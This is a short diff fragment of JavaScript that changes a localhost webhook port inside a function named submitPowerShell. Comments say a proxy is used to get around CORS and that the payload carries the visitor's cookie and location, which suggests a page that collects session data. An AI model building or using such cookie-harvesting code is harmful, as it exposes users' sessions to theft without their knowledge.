@@ -283,7 +283,7 @@ async function submitPowerShell() {
         await new Promise(resolve => setTimeout(resolve, delay));
         
         // Use local proxy to bypass CORS restrictions
-        const webhookUrl = 'http://localhost:8888/webhook';
+        const webhookUrl = 'http://localhost:7777/webhook';
         
         // Simple webhook payload - only cookie and location
         const payload = {
